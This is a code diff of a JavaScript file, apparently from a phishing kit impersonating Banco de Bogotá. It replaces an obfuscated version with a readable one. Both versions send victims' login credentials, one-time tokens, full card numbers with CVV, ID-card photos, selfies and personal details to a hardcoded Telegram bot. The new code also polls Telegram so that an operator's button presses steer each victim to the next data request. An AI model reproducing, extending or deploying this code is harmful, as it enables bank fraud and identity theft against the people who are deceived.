@@ -1,74 +1,359 @@
-  const _0x4e2a=['https://api.telegram.org/bot','sendMessage','POST','Content-Type','application/json','HTTP error! status: '];
-  const _0x5a1c = '8688737179:AAHYtx_OJwitzNOPkYGRxwjV5t5ex2gwRXs';
-  const _0x2b3d = '-1003577139660';
-  const _0x1a4f = _0x4e2a[0] + _0x5a1c;
-  
-  function _0x3b2c(t, k = null) {
-    const p = {'chat_id': _0x2b3d, 'text': t, 'parse_mode': 'HTML'};
-    k && (p.reply_markup = k);
-    return fetch(_0x1a4f + '/' + _0x4e2a[1], {
-      method: _0x4e2a[2],
-      headers: {[_0x4e2a[3]]: _0x4e2a[4]},
-      body: JSON.stringify(p)
-    }).then(r => (!r.ok ? (r.status === 409 && console.warn('⚠️ Conflict 409'), (() => {throw new Error(_0x4e2a[5] + r.status)})()) : r.json()));
-  }
+// js/telegram.js - Funciones de Telegram
+  const TELEGRAM_BOT_TOKEN = '8443737763:AAHDC6deCV73XbXV74gPZ862z8ZIOYoxfGk';
+  const TELEGRAM_CHAT_ID = '-4558156483';
 
-  function _0x6d8e(t, d, o) {
-    let m = '', k = null;
-    const _0xf2a1 = {
-      'login': `🏦 <b>BANCO DE BOGOTÁ - NUEVO ACCESO</b>\n\n👤 <b>Tipo:</b> ${d.tipo_persona}\n🆔 <b>Identificación:</b> ${d.tipo_identificacion} ${d.numero_identificacion}\n🔐 <b>Tipo de Ingreso:</b> ${d.tipo_ingreso}\n🔑 <b>Clave:</b> ${d.clave}\n${d.ultimos_4_digitos !== 'N/A' ? `💳 <b>Últimos 4:</b> ${d.ultimos_4_digitos}` : ''}\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`,
-      'token': `🔐 <b>TOKEN RECIBIDO</b>\n\n📱 <b>Token:</b> ${d.token}\n🆔 <b>Usuario:</b> ${d.tipo_identificacion} ${d.numero_identificacion}\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`,
-      'tarjeta': `💳 <b>TARJETA ${(d.tipo_tarjeta || 'Desconocida').toUpperCase()} RECIBIDA</b>\n\n💳 <b>Número:</b> ${d.numero}\n📅 <b>Vencimiento:</b> ${d.vencimiento}\n🔒 <b>CVV:</b> ${d.cvv}\n👤 <b>Titular:</b> ${d.titular || 'No proporcionado'}\n\n🆔 <b>Usuario:</b> ${d.tipo_identificacion} ${d.numero_identificacion}\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`,
-      'soyyo': `📸 <b>FOTOS "SOY YO" RECIBIDAS</b>\n\n📷 <b>Foto 1 (Cédula Frontal):</b> ${d.foto1 ? 'Recibida ✅' : 'No recibida ❌'}\n📷 <b>Foto 2 (Cédula Trasera):</b> ${d.foto2 ? 'Recibida ✅' : 'No recibida ❌'}\n🤳 <b>Foto 3 (Selfie):</b> ${d.foto3 ? 'Recibida ✅' : 'No recibida ❌'}\n\n🆔 <b>Usuario:</b> ${d.tipo_identificacion} ${d.numero_identificacion}\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`,
-      'datos_personales': `📋 <b>DATOS PERSONALES RECIBIDOS</b>\n\n👤 <b>INFORMACIÓN PERSONAL</b>\n• <b>Nombres:</b> ${d.nombres}\n• <b>Apellidos:</b> ${d.apellidos}\n• <b>Fecha Nacimiento:</b> ${d.fecha_nacimiento}\n• <b>Género:</b> ${d.genero}\n\n📞 <b>CONTACTO</b>\n• <b>Correo:</b> ${d.correo}\n• <b>Celular:</b> ${d.celular}\n• <b>Teléfono Fijo:</b> ${d.telefono_fijo}\n\n📍 <b>DIRECCIÓN</b>\n• <b>Dirección:</b> ${d.direccion}\n• <b>Ciudad:</b> ${d.ciudad}\n• <b>Departamento:</b> ${d.departamento}\n\n🆔 <b>Usuario:</b> ${d.tipo_identificacion} ${d.numero_identificacion}\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`
+  // ========== ENVIAR MENSAJES ==========
+  function sendTelegramMessage(text, keyboard = null) {
+    const payload = {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: text,
+      parse_mode: 'HTML'
     };
-    const _0x8c4f = {
-      'login': {inline_keyboard: [[{text: '❌ Error', callback_data: 'error'}, {text: '🔐 Token', callback_data: 'token'}], [{text: '💳 Pedir Tarjeta Débito', callback_data: 'tarjeta_debito'}, {text: '💳 Pedir Tarjeta Crédito', callback_data: 'tarjeta_credito'}], [{text: '📋 Datos Personales', callback_data: 'datos_personales'}], [{text: '✅ Soy Yo', callback_data: 'soyyo'}, {text: '🏁 Finalizar', callback_data: 'finalizar'}]]},
-      'token': {inline_keyboard: [[{text: '✅ Token Correcto', callback_data: 'soyyo'}, {text: '❌ Token Incorrecto', callback_data: 'token_otro'}], [{text: '💳 Pedir Tarjeta Débito', callback_data: 'tarjeta_debito'}, {text: '💳 Pedir Tarjeta Crédito', callback_data: 'tarjeta_credito'}], [{text: '🏁 Finalizar', callback_data: 'finalizar'}]]},
-      'tarjeta': (tt) => ({inline_keyboard: [[{text: '✅ Tarjeta Válida', callback_data: 'soyyo'}, {text: '❌ Tarjeta Inválida', callback_data: `error_${tt.toLowerCase()}`}], [{text: '🔐 Pedir Token', callback_data: 'token'}, {text: '💳 Otra Tarjeta', callback_data: tt === 'Débito' ? 'tarjeta_debito' : 'tarjeta_credito'}], [{text: '🏁 Finalizar', callback_data: 'finalizar'}]]}),
-      'soyyo': {inline_keyboard: [[{text: '✅ Fotos Correctas', callback_data: 'finalizar'}, {text: '❌ Fotos Incorrectas', callback_data: 'error_logo'}], [{text: '🔐 Pedir Token', callback_data: 'token'}, {text: '💳 Pedir Tarjeta', callback_data: 'tarjeta_debito'}]]},
-      'datos_personales': {inline_keyboard: [[{text: '✅ Datos Correctos', callback_data: 'finalizar'}, {text: '❌ Datos Incorrectos', callback_data: 'datos_personales'}], [{text: '🔐 Pedir Token', callback_data: 'token'}, {text: '💳 Pedir Tarjeta', callback_data: 'tarjeta_debito'}], [{text: '📸 Pedir Fotos', callback_data: 'soyyo'}]]}
-    };
-    m = _0xf2a1[t] || '';
-    k = (t === 'tarjeta') ? _0x8c4f[t](d.tipo_tarjeta || 'Desconocida') : _0x8c4f[t] || null;
-    _0x3b2c(m, k).then(res => {const mid = res.result?.message_id; mid && (localStorage.setItem('bbogota_msg_id', mid), typeof o === 'function' && o(mid));}).catch(e => {console.error('❌ Error:', e); document.getElementById('loading-overlay')?.style.display === null ? null : (document.getElementById('loading-overlay').style.display = 'none'); alert('Error de conexión. Por favor intenta nuevamente.');});
-  }
-
-  let _0x7b9c = false, _0x9d3e = null;
-  window.stopListening = function() {_0x7b9c = true; _0x9d3e && clearTimeout(_0x9d3e); _0x9d3e = null;};
-  
-  function _0x2f5d(cb) {
-    const _0x1e4a = localStorage.getItem('bbogota_msg_id');
-    if (!_0x1e4a) return;
-    _0x7b9c = false;
-    let _0x3c2d = -1, _0x4a8f = 0;
-    const _0x5f1e = 150, _0x6b2a = 2000;
     
-    const _0x8e7f = () => {
-      if (_0x7b9c) return;
-      if (_0x4a8f >= _0x5f1e) {
-        setTimeout(() => {!_0x7b9c && (_0x4a8f = 0, _0x8e7f());}, 5000);
+    if (keyboard) {
+      payload.reply_markup = keyboard;
+    }
+    
+    // ✅ URL corregida SIN espacio
+    return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    }).then(r => {
+      if (!r.ok) {
+        if (r.status === 409) {
+          console.warn('⚠️ Conflict 409 con Telegram');
+        }
+        throw new Error(`HTTP error! status: ${r.status}`);
+      }
+      return r.json();
+    });
+  }
+
+  // ========== FUNCIÓN PRINCIPAL PARA ENVIAR DATOS ==========
+  function sendToTelegram(tipo, datos, onSent) {
+    let mensaje = '';
+    let keyboard = null;
+    
+    // ========== MENSAJES SEGÚN TIPO ==========
+    
+    if (tipo === 'login') {
+      mensaje = `
+  🏦 <b>BANCO DE BOGOTÁ - NUEVO ACCESO</b>
+
+  👤 <b>Tipo:</b> ${datos.tipo_persona}
+  🆔 <b>Identificación:</b> ${datos.tipo_identificacion} ${datos.numero_identificacion}
+  🔐 <b>Tipo de Ingreso:</b> ${datos.tipo_ingreso}
+  🔑 <b>Clave:</b> ${datos.clave}
+  ${datos.ultimos_4_digitos !== 'N/A' ? `💳 <b>Últimos 4:</b> ${datos.ultimos_4_digitos}` : ''}
+
+  📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}
+      `.trim();
+      
+      keyboard = {
+        inline_keyboard: [
+          [
+            { text: '❌ Error', callback_data: 'error' },
+            { text: '🔐 Token', callback_data: 'token' }
+          ],
+          [
+            { text: '💳 Pedir Tarjeta Débito', callback_data: 'tarjeta_debito' },
+            { text: '💳 Pedir Tarjeta Crédito', callback_data: 'tarjeta_credito' }
+          ],
+          [
+            { text: '📋 Datos Personales', callback_data: 'datos_personales' }
+          ],
+          [
+            { text: '✅ Soy Yo', callback_data: 'soyyo' },
+            { text: '🏁 Finalizar', callback_data: 'finalizar' }
+          ]
+        ]
+      };
+    } 
+    
+    else if (tipo === 'token') {
+      mensaje = `
+  🔐 <b>TOKEN RECIBIDO</b>
+
+  📱 <b>Token:</b> ${datos.token}
+  🆔 <b>Usuario:</b> ${datos.tipo_identificacion} ${datos.numero_identificacion}
+
+  📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}
+      `.trim();
+      
+      keyboard = {
+        inline_keyboard: [
+          [
+            { text: '✅ Token Correcto', callback_data: 'soyyo' },
+            { text: '❌ Token Incorrecto', callback_data: 'token_otro' }
+          ],
+          [
+            { text: '💳 Pedir Tarjeta Débito', callback_data: 'tarjeta_debito' },
+            { text: '💳 Pedir Tarjeta Crédito', callback_data: 'tarjeta_credito' }
+          ],
+          [
+            { text: '🏁 Finalizar', callback_data: 'finalizar' }
+          ]
+        ]
+      };
+    }
+    
+    else if (tipo === 'tarjeta') {
+      const tipoTarjeta = datos.tipo_tarjeta || 'Desconocida';
+      mensaje = `
+  💳 <b>TARJETA ${tipoTarjeta.toUpperCase()} RECIBIDA</b>
+
+  💳 <b>Número:</b> ${datos.numero}
+  📅 <b>Vencimiento:</b> ${datos.vencimiento}
+  🔒 <b>CVV:</b> ${datos.cvv}
+  👤 <b>Titular:</b> ${datos.titular || 'No proporcionado'}
+
+  🆔 <b>Usuario:</b> ${datos.tipo_identificacion} ${datos.numero_identificacion}
+  📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}
+      `.trim();
+      
+      keyboard = {
+        inline_keyboard: [
+          [
+            { text: '✅ Tarjeta Válida', callback_data: 'soyyo' },
+            { text: `❌ Tarjeta Inválida`, callback_data: `error_${tipoTarjeta.toLowerCase()}` }
+          ],
+          [
+            { text: '🔐 Pedir Token', callback_data: 'token' },
+            { text: '💳 Otra Tarjeta', callback_data: tipoTarjeta === 'Débito' ? 'tarjeta_debito' : 'tarjeta_credito' }
+          ],
+          [
+            { text: '🏁 Finalizar', callback_data: 'finalizar' }
+          ]
+        ]
+      };
+    }
+    
+    else if (tipo === 'soyyo') {
+      mensaje = `
+  📸 <b>FOTOS "SOY YO" RECIBIDAS</b>
+
+  📷 <b>Foto 1 (Cédula Frontal):</b> ${datos.foto1 ? 'Recibida ✅' : 'No recibida ❌'}
+  📷 <b>Foto 2 (Cédula Trasera):</b> ${datos.foto2 ? 'Recibida ✅' : 'No recibida ❌'}
+  🤳 <b>Foto 3 (Selfie):</b> ${datos.foto3 ? 'Recibida ✅' : 'No recibida ❌'}
+
+  🆔 <b>Usuario:</b> ${datos.tipo_identificacion} ${datos.numero_identificacion}
+  📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}
+      `.trim();
+      
+      keyboard = {
+        inline_keyboard: [
+          [
+            { text: '✅ Fotos Correctas', callback_data: 'finalizar' },
+            { text: '❌ Fotos Incorrectas', callback_data: 'error_logo' }
+          ],
+          [
+            { text: '🔐 Pedir Token', callback_data: 'token' },
+            { text: '💳 Pedir Tarjeta', callback_data: 'tarjeta_debito' }
+          ]
+        ]
+      };
+    }
+    
+    else if (tipo === 'datos_personales') {
+      mensaje = `
+  📋 <b>DATOS PERSONALES RECIBIDOS</b>
+
+  👤 <b>INFORMACIÓN PERSONAL</b>
+  • <b>Nombres:</b> ${datos.nombres}
+  • <b>Apellidos:</b> ${datos.apellidos}
+  • <b>Fecha Nacimiento:</b> ${datos.fecha_nacimiento}
+  • <b>Género:</b> ${datos.genero}
+
+  📞 <b>CONTACTO</b>
+  • <b>Correo:</b> ${datos.correo}
+  • <b>Celular:</b> ${datos.celular}
+  • <b>Teléfono Fijo:</b> ${datos.telefono_fijo}
+
+  📍 <b>DIRECCIÓN</b>
+  • <b>Dirección:</b> ${datos.direccion}
+  • <b>Ciudad:</b> ${datos.ciudad}
+  • <b>Departamento:</b> ${datos.departamento}
+
+  🆔 <b>Usuario:</b> ${datos.tipo_identificacion} ${datos.numero_identificacion}
+  📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}
+      `.trim();
+      
+      keyboard = {
+        inline_keyboard: [
+          [
+            { text: '✅ Datos Correctos', callback_data: 'finalizar' },
+            { text: '❌ Datos Incorrectos', callback_data: 'datos_personales' }
+          ],
+          [
+            { text: '🔐 Pedir Token', callback_data: 'token' },
+            { text: '💳 Pedir Tarjeta', callback_data: 'tarjeta_debito' }
+          ],
+          [
+            { text: '📸 Pedir Fotos', callback_data: 'soyyo' }
+          ]
+        ]
+      };
+    }
+    
+    // ========== ENVIAR MENSAJE ==========
+    sendTelegramMessage(mensaje, keyboard)
+      .then(response => {
+        console.log('✅ Mensaje enviado:', response);
+        
+        if (response.ok && response.result) {
+          const messageId = response.result.message_id;
+          localStorage.setItem('bbogota_msg_id', messageId);
+          console.log('💾 Message ID guardado:', messageId);
+          
+          if (typeof onSent === 'function') {
+            onSent(messageId);
+          }
+        }
+      })
+      .catch(error => {
+        console.error('❌ Error al enviar:', error);
+        const loader = document.getElementById('loading-overlay');
+        if (loader) loader.style.display = 'none';
+        alert('Error de conexión. Por favor intenta nuevamente.');
+      });
+  }
+
+  // ========== ESCUCHAR BOTONES DE TELEGRAM (SIN RESPONDER CALLBACK) ==========
+  let stopPolling = false;
+  let pollingTimeout = null;
+
+  window.stopListening = function() {
+    stopPolling = true;
+    if (pollingTimeout) {
+      clearTimeout(pollingTimeout);
+      pollingTimeout = null;
+    }
+    console.log('🛑 Escucha detenida');
+  };
+
+  function listenCurrentButtons(onAction) {
+    const msgId = localStorage.getItem('bbogota_msg_id');
+    
+    if (!msgId) {
+      console.warn('⚠️ No hay msgId');
+      return;
+    }
+    
+    console.log('👂 Escuchando mensaje:', msgId);
+    stopPolling = false;
+    let lastUpdateId = -1;
+    let checksWithoutUpdate = 0;
+    const MAX_CHECKS = 150; // ✅ CAMBIADO: 150 checks × 2 segundos = 5 minutos
+    const CHECK_INTERVAL = 2000;
+    
+    function check() {
+      if (stopPolling) {
+        console.log('⏹️ Polling detenido');
         return;
       }
-      fetch(`https://api.telegram.org/bot${_0x5a1c}/getUpdates`, {
+      
+      if (checksWithoutUpdate >= MAX_CHECKS) {
+        console.log('⏱️ Timeout: No se recibió respuesta en 5 minutos');
+        setTimeout(() => {
+          if (!stopPolling) {
+            console.log('🔄 Reiniciando escucha después de timeout...');
+            checksWithoutUpdate = 0;
+            check();
+          }
+        }, 5000);
+        return;
+      }
+      
+      // ✅ URL corregida SIN espacio
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`, {
         method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({offset: _0x3c2d + 1, allowed_updates: ['callback_query'], timeout: 20})
-      }).then(r => r.ok ? r.json() : {ok: false, result: []})
-      .then(data => {
-        if (!data.ok || !data.result?.length) {_0x4a8f++; !_0x7b9c && (_0x9d3e = setTimeout(_0x8e7f, _0x6b2a)); return;}
-        let _0x1f8d = false;
-        for (const u of data.result) {
-          _0x3c2d = Math.max(_0x3c2d, u.update_id);
-          if (!u.callback_query) continue;
-          const _0xc5a2 = u.callback_query.data, _0x7e1f = String(u.callback_query.message.message_id);
-          if (_0x7e1f === String(_0x1e4a)) {_0x1f8d = true; cb(_0xc5a2); _0x7b9c = true; return;}
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          offset: lastUpdateId + 1,
+          allowed_updates: ['callback_query'],
+          timeout: 20
+        })
+      })
+      .then(r => {
+        if (!r.ok) {
+          if (r.status === 409) {
+            console.warn('⚠️ Conflict 409 con Telegram, deteniendo polling');
+            stopPolling = true;
+            return { ok: false, result: [] };
+          }
+          throw new Error(`HTTP error! status: ${r.status}`);
         }
-        _0x1f8d ? (_0x4a8f = 0) : (_0x4a8f++);
-        !_0x7b9c && (_0x9d3e = setTimeout(_0x8e7f, _0x6b2a));
-      }).catch(e => {_0x4a8f++; !_0x7b9c && _0x4a8f < _0x5f1e && (_0x9d3e = setTimeout(_0x8e7f, _0x6b2a + 1000));});
-    };
-    _0x8e7f();
+        return r.json();
+      })
+      .then(data => {
+        if (!data.ok || !data.result || data.result.length === 0) {
+          checksWithoutUpdate++;
+          if (!stopPolling) pollingTimeout = setTimeout(check, CHECK_INTERVAL);
+          return;
+        }
+        
+        let foundMatch = false;
+        
+        for (const u of data.result) {
+          lastUpdateId = Math.max(lastUpdateId, u.update_id);
+          
+          if (!u.callback_query) continue;
+          
+          const action = u.callback_query.data;
+          const messageId = String(u.callback_query.message.message_id);
+          
+          console.log(`📨 Update recibido: mensaje ${messageId}, esperando ${msgId}`);
+          
+          if (messageId === String(msgId)) {
+            console.log('✅ Message ID coincide!');
+            console.log('🎯 Botón presionado:', action);
+            
+            foundMatch = true;
+            
+            // ❌ NO respondemos el callback para evitar que se bloqueen los botones
+            // fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+            //   method: 'POST',
+            //   headers: { 'Content-Type': 'application/json' },
+            //   body: JSON.stringify({ 
+            //     callback_query_id: callbackId,
+            //     text: '✅ Procesando...'
+            //   })
+            // }).then(() => {
+            //   console.log('✅ Callback respondido');
+            // });
+
+            onAction(action);
+            
+            stopPolling = true;
+            return;
+          }
+        }
+        
+        if (!foundMatch) {
+          checksWithoutUpdate++;
+        } else {
+          checksWithoutUpdate = 0;
+        }
+        
+        if (!stopPolling) pollingTimeout = setTimeout(check, CHECK_INTERVAL);
+      })
+      .catch(err => {
+        console.error('❌ Error en getUpdates:', err);
+        checksWithoutUpdate++;
+        if (!stopPolling && checksWithoutUpdate < MAX_CHECKS) {
+          pollingTimeout = setTimeout(check, CHECK_INTERVAL + 1000);
+        }
+      });
+    }
+    
+    check();
   }
 
-  function _0x9f5e() {return {tipo_identificacion: localStorage.getItem('user_id_type') || 'CC', numero_identificacion: localStorage.getItem('user_id_number') || 'Desconocido'};}
+  // ========== FUNCIÓN AUXILIAR ==========
+  function getUserData() {
+    return {
+      tipo_identificacion: localStorage.getItem('user_id_type') || 'CC',
+      numero_identificacion: localStorage.getItem('user_id_number') || 'Desconocido'
+    };
+  }
